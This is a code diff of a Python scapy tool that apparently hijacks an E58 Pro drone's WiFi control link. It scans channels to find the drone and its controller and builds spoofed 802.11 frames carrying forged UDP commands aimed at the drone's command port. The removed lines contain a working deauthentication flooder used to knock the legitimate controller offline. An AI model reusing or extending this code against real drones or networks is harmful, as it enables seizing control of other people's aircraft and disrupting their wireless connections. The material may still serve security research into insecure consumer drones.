@@ -9,22 +9,15 @@ from scapy.layers.inet import IP, UDP
 from scapy.layers.l2 import LLC, SNAP
 from scapy.packet import Packet
 from scapy.sendrecv import sendp, send, sniff
-from threading import Thread, Event
 
 from e58pro.command_payloads import new_video_ack, E58ProBasePayload, E58VideoACKExtension
+from e58pro.transmitter_process import TransmitterProcessController, CommandRequest
 
-from e58pro.address_results import AddressResults
+from e58pro.connection_addresses import ConnectionAddresses
 
 from scanners.channel_scanner import scan_channels
 from scanners.interface_controller import InterfaceController
 
-DEAUTH_REASON = 0x03
-# 1314 microseconds. Arbitrary? I think I stole this value from airodump captures.
-SEND_DURATION = 1314
-DEAUTH_SUBTYPE = 12
-
-# Can be either DOT11Deauth or Dot11Disas
-DOT11_DISCONNECT_TYPE = Dot11Disas
 
 DRONE_COMMAND_RECEIVE_PORT = 8800
 DRONE_VIDEO_SEND_PORT = 1234
@@ -36,17 +29,14 @@ COMPLEX_SCANNER_BPF_FILTER = "udp"
 
 SSID_ELEMENT_ID = 0
 
-DEAUTHS_PER_SECOND = 40
-KEEP_ALIVES_PER_SECOND = 40
-
-# TODO: Have the user choose either connected or connectionless mode.
-#  If connectionless, start a scan, then do the unconnected_routine
-#  If connected, initiate connection (have user do that?), then do connected routine.
-
-UDP_SRC_PORT = 49092  # Arbitrary. Will be where video is sent back?
+UDP_SRC_PORT = 49092  # TODO: Will be need to be set to the port the video is being sent to.
 UDP_DST_PORT = 8800
 
-EndpointRoutine = Callable[[str, UDP, Callable], None]
+DEFAULT_INTERFACE = "wlx4401bb9182b7"
+
+COMMANDS_PER_SECOND = 40
+
+EndpointRoutine = Callable[[TransmitterProcessController], None]
 
 
 def _udp_layer_3_4(drone_ip: str, controller_ip: str) -> UDP:
@@ -55,6 +45,7 @@ def _udp_layer_3_4(drone_ip: str, controller_ip: str) -> UDP:
 
 
 def _dot11_layer_2(drone_mac: str, controller_mac: str) -> SNAP():
+    # QoS Data
     return RadioTap(present="Rate+TXFlags") / \
            Dot11FCS(addr1=drone_mac, addr2=controller_mac, addr3=drone_mac, type=2, subtype=8) / \
            Dot11QoS() / \
@@ -62,83 +53,28 @@ def _dot11_layer_2(drone_mac: str, controller_mac: str) -> SNAP():
            SNAP()
 
 
-def _new_sequence_control(frag: int, seq: int) -> int:
-    return (seq << 4) + frag
-
-
-def new_deauth(dst_mac: str, src_mac: str, ap_mac: str, seq_num: int, reason: int) -> Dot11Deauth:
-    sc = _new_sequence_control(0, seq_num)
-    # TODO: Why is the RadioTap header with those present flags necessary?
-    return RadioTap(present="Rate+TXFlags") / \
-           Dot11(ID=SEND_DURATION, addr1=dst_mac, addr2=src_mac, addr3=ap_mac, SC=sc) / \
-           DOT11_DISCONNECT_TYPE(reason=reason)
-
-
-def _start_deauther(interface_name: str, deauth: Packet) -> Event:
-    is_terminating = Event()
-
-    def deauth_loop():
-        seq = 0
-        while not is_terminating.set():
-            sendp(deauth, iface=interface_name, verbose=False)
-            deauth[Dot11].SC = _new_sequence_control(0, seq)
-            seq += 1
-            sleep(1 / DEAUTHS_PER_SECOND)
-
-    thread = Thread(target=deauth_loop)
-    thread.start()
-
-    return is_terminating
-
-
-# FIXME: Will need to sniff for the current ack number using _scan_for_current_video_ack in auto_pwn
-#  Combine autopwn and this file since it's not clear what should go where. They're very similar.
-def _start_udp_keep_alive(interface_name: str, l4_base: Packet, sender_func: Callable) -> Event:
-    is_terminating = Event()
-
-    def keep_alive_loop():
-        # comm_keep_alive = l4_base / new_default_command_payload()
-        video_keep_alive = l4_base / new_video_ack(0)
-
-        seq_n = 0
-        while not is_terminating.is_set():
-            video_keep_alive[E58ProBasePayload].sequence_number = seq_n
-            # sender_func(comm_keep_alive, iface=interface_name, verbose=False)
-            sender_func(video_keep_alive, iface=interface_name, verbose=False)
-            seq_n += 1
-            sleep(1 / KEEP_ALIVES_PER_SECOND)
-
-    thread = Thread(target=keep_alive_loop)
-    thread.start()
-
-    return is_terminating
-
-
 # TODO: Also start thread that watches for video ACK numbers and responds to keep the video feed flowing.
 # TODO: Use a separate process instead so the main process doesn't get bogged down with sends?
 
 
 def connectionless_interception_routine(interface_name: str,
-                                        addrs: AddressResults,
+                                        addrs: ConnectionAddresses,
                                         endpoint_routine: EndpointRoutine):
     """Intercepts an existing connection with a drone, then runs the endpoint routine 'payload' once interception is complete.
     endpoint_routine accepts the name of the interface to use, a UDP packet to build packets with, and
     a function (either of scapy's send or sendp) to use to send."""
     sender_func = sendp
 
-    l4_base = _dot11_layer_2(addrs.drone_mac, addrs.controller_mac) / \
-              _udp_layer_3_4(addrs.drone_ip, addrs.controller_ip)
-
-    deauth = new_deauth(addrs.controller_mac, addrs.drone_mac, addrs.drone_mac, 1, DEAUTH_REASON)
-    keep_alive_terminating = _start_udp_keep_alive(interface_name, l4_base, sender_func)
-    deauth_terminating = _start_deauther(interface_name, deauth)
+    controller_l4_base = _dot11_layer_2(addrs.drone_mac, addrs.controller_mac) / \
+                         _udp_layer_3_4(addrs.drone_ip, addrs.controller_ip)
     try:
-        endpoint_routine(interface_name, l4_base, sender_func)
+        with TransmitterProcessController(interface_name, COMMANDS_PER_SECOND, controller_l4_base, sender_func) as proc:
+            endpoint_routine(proc)
     except KeyboardInterrupt:
         pass
-    finally:
-        deauth_terminating.set()
-        keep_alive_terminating.set()
+
+
+
 
 
 def connected_interception_routine(interface_name: str,
@@ -147,22 +83,26 @@ def connected_interception_routine(interface_name: str,
                                    endpoint_routine: EndpointRoutine) -> None:
     """Used when you're actually connected to the drone's network."""
     layers_3_4 = _udp_layer_3_4(drone_ip, controller_ip)
-    endpoint_routine(interface_name, layers_3_4, send)
+    try:
+        with TransmitterProcessController(interface_name, COMMANDS_PER_SECOND, layers_3_4, send) as proc:
+            endpoint_routine(proc)
+    except KeyboardInterrupt:
+        pass
 
 
-def drone_packet_verifier(packet: Packet) -> Optional[AddressResults]:
+def drone_packet_verifier(packet: Packet) -> Optional[ConnectionAddresses]:
     """Returns a pair of ((drone_mac, drone_ip), (controller_mac, controller_ip)) if verified, else None."""
     if UDP in packet:
         src_tup = (packet[Dot11].addr2, packet[IP].src)
         dst_tup = (packet[Dot11].addr1, packet[IP].dst)
         if packet[UDP].dport == DRONE_COMMAND_RECEIVE_PORT:
-            return AddressResults(*dst_tup, *src_tup)
+            return ConnectionAddresses(*dst_tup, *src_tup)
         elif packet[UDP].sport == DRONE_VIDEO_SEND_PORT:
-            return AddressResults(*src_tup, *dst_tup)
+            return ConnectionAddresses(*src_tup, *dst_tup)
     return None
 
 
-def scan_for_drone(interface_name: str, secs_per_channel: float = 0.3) -> tuple[int, AddressResults]:
+def scan_for_drone(interface_name: str, secs_per_channel: float = 0.3) -> tuple[int, ConnectionAddresses]:
     """Scans over all supported channels attempting to find the drone.
     Blocks until the drone is found, at which point a tuple of
     (channel, drone_mac_ip_tup, controller_mac_ip_tup) is returned."""
@@ -218,9 +158,11 @@ def scan_for_drone_traffic(interface_name: str,
 
 
 def _scan_for_current_video_ack(interface_name: str, timeout: Optional[float] = None) -> Optional[int]:
-    def is_video(p: Packet) -> bool:
-        return E58VideoACKExtension in p
-    found = sniff(iface=interface_name, count=1, filter="udp", lfilter=is_video, timeout=timeout)
+    found = sniff(iface=interface_name,
+                  count=1,
+                  filter="udp",
+                  lfilter=lambda p: E58VideoACKExtension in p,
+                  timeout=timeout)
     if found:
         return found[0][E58VideoACKExtension].ack_number
     else:
@@ -252,3 +194,9 @@ def connected_main(interface_name: str, endpoint_routine: EndpointRoutine) -> No
 
     connected_interception_routine(interface_name, drone_ip, our_ip, endpoint_routine)
 
+
+def test_routine():
+    chan, addrs = scan_for_drone(DEFAULT_INTERFACE, 2)
+    controller_l4_base = _dot11_layer_2(addrs.drone_mac, addrs.controller_mac) / \
+                         _udp_layer_3_4(addrs.drone_ip, addrs.controller_ip)
+    return TransmitterProcessController(DEFAULT_INTERFACE, 40, controller_l4_base, sendp)
